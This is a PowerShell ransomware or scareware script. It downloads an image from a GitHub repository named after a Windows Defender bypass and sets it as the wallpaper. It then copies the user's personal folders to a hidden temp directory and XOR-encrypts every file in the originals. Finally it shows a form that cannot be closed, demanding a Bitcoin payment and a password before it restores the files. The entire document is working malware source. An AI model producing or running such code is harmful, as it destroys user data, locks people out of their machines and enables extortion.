Add-Type -AssemblyName System.Windows.Forms

# Change desktop wallpaper
$wallpaperPath = "$env:TEMP\scareware.png"
$imageUrl = "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/refs/heads/main/scareware.png"
Invoke-WebRequest -Uri $imageUrl -OutFile $wallpaperPath -UseBasicParsing

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

$SPI_SETDESKWALLPAPER = 0x0014
$SPIF_UPDATEINIFILE = 0x01
$SPIF_SENDWININICHANGE = 0x02

[Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $wallpaperPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDWININICHANGE)

# Hide mouse cursor
# [System.Windows.Forms.Cursor]::Hide()

# Settings
$userProfile = $env:USERPROFILE
$password = "coffee123"
$scriptPath = $MyInvocation.MyCommand.Path

# Temporary backup root directory (hidden)
$tempBackupRoot = Join-Path -Path $env:TEMP -ChildPath ([guid]::NewGuid().ToString())
New-Item -Path $tempBackupRoot -ItemType Directory -Force | Out-Null

# Make backup folder hidden
$attribs = Get-Item $tempBackupRoot
$attribs.Attributes = "Hidden"

# Target user dirs: Desktop etc
$dirsToProcess = @(
    Join-Path $userProfile "Desktop"
    Join-Path $userProfile "Documents"
    Join-Path $userProfile "Downloads"
    Join-Path $userProfile "Pictures"
    Join-Path $userProfile "Music"
    Join-Path $userProfile "Videos"
    Join-Path $userProfile "Favorites"
    Join-Path $userProfile "Contacts"
    Join-Path $userProfile "Saved Games"
    Join-Path $userProfile "Searches"
    Join-Path $userProfile "3D Objects"
    Join-Path $userProfile "Public"
    Join-Path $userProfile "OneDrive"
    Join-Path $userProfile "Default"
)

function Encrypt-File {
    param([string]$filePath)

    if ($filePath -eq $scriptPath) { return }

    # A simple reversible XOR encryption like before
    $xorKey = 0x5A
    $bytes = [System.IO.File]::ReadAllBytes($filePath)
    for ($i=0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $xorKey
    }
    [System.IO.File]::WriteAllBytes($filePath, $bytes)
    Write-Host "Encrypted: $filePath"
}

# Recursively copy full dir tree preserving structure to backup folder
function Copy-ToBackup {
    param($sourceDir,$backupDir)

    foreach ($item in Get-ChildItem -Path $sourceDir -Recurse -Force) {
        $relativePath = $item.FullName.Substring($sourceDir.Length)
        $destPath = Join-Path -Path $backupDir -ChildPath $relativePath.TrimStart('\')

        if ($item.PSIsContainer) {
            if (-not (Test-Path $destPath)) {
                New-Item -ItemType Directory -Path $destPath -Force | Out-Null
            }
        }
        else {
            $destFolder = Split-Path -Path $destPath -Parent
            if (-not (Test-Path $destFolder)) {
                New-Item -ItemType Directory -Path $destFolder -Force | Out-Null
            }
            Copy-Item -Path $item.FullName -Destination $destPath -Force
        }
    }
}

# Delete original files and directories (except script) before encryption for better effect (optional)

# Backup each folder before encrypting
foreach ($dir in $dirsToProcess) {
    if (Test-Path $dir) {
        $backupLocation = Join-Path -Path $tempBackupRoot -ChildPath ([IO.Path]::GetFileName($dir))
        Copy-ToBackup -sourceDir $dir -backupDir $backupLocation
    }
}

# Now encrypt original files
foreach ($dir in $dirsToProcess) {
    if (Test-Path $dir) {
        Get-ChildItem -Path $dir -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            Encrypt-File $_.FullName
        }
    }
}

# GUI to prompt password
$form = New-Object System.Windows.Forms.Form
$form.Text = "Your files have been encrypted!"
$form.Size = New-Object System.Drawing.Size(400,200)
$form.StartPosition = "CenterScreen"
$form.Topmost = $true
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ControlBox = $false

$label = New-Object System.Windows.Forms.Label
$label.Text = "Your files have been encrypted.`nEnter the password to restore your files.`nSend 0.00025 Bitcoins to my account."
$label.Size = New-Object System.Drawing.Size(380,60)
$label.Location = New-Object System.Drawing.Point(10,10)
$form.Controls.Add($label)

$pwLabel = New-Object System.Windows.Forms.Label
$pwLabel.Text = "Enter password:"
$pwLabel.Size = New-Object System.Drawing.Size(100,20)
$pwLabel.Location = New-Object System.Drawing.Point(10,80)
$form.Controls.Add($pwLabel)

$pwBox = New-Object System.Windows.Forms.TextBox
$pwBox.UseSystemPasswordChar = $true
$pwBox.Size = New-Object System.Drawing.Size(260,20)
$pwBox.Location = New-Object System.Drawing.Point(110,80)
$form.Controls.Add($pwBox)

$okButton = New-Object System.Windows.Forms.Button
$okButton.Text = "OK"
$okButton.Location = New-Object System.Drawing.Point(300,110)
$form.Controls.Add($okButton)

$global:passwordCorrect = $false

function Restore-Backup {
    param($backupRoot, $originalRoot)
    # Recursively copy backup files back to originals to restore state
    foreach ($item in Get-ChildItem -Path $backupRoot -Recurse -Force) {
        $relPath = $item.FullName.Substring($backupRoot.Length).TrimStart('\')
        $destPath = Join-Path -Path $originalRoot -ChildPath $relPath

        if ($item.PSIsContainer) {
            if (-not (Test-Path $destPath)) {
                New-Item -ItemType Directory -Path $destPath -Force | Out-Null
            }
        }
        else {
            Copy-Item -Path $item.FullName -Destination $destPath -Force
        }
    }
}

$okButton.Add_Click({
    if ($pwBox.Text -eq $password) {
        # Restore from backup folder all directories/files
        foreach ($dir in $dirsToProcess) {
            $backupLocation = Join-Path -Path $tempBackupRoot -ChildPath ([IO.Path]::GetFileName($dir))
            if (Test-Path $backupLocation) {
                Restore-Backup -backupRoot $backupLocation -originalRoot $dir
            }
        }
        $global:passwordCorrect = $true
        [System.Windows.Forms.Cursor]::Show()
        $form.Close()
    }
    else {
        [System.Windows.Forms.MessageBox]::Show("Incorrect password. Try again.","Error",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
        $pwBox.Clear()
        $pwBox.Focus()
    }
})

$form.Add_Closing({
    param($sender,$e)
    if (-not $global:passwordCorrect) {
        $e.Cancel = $true
        [System.Windows.Forms.MessageBox]::Show("You must enter the correct password to exit.","Warning",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning) | Out-Null
    }
    else {
        [System.Windows.Forms.Cursor]::Show()
    }
})

$form.Add_Shown({ $form.Activate() })
[void]$form.ShowDialog()

Write-Host "Script finished. Files restored if correct password was entered."

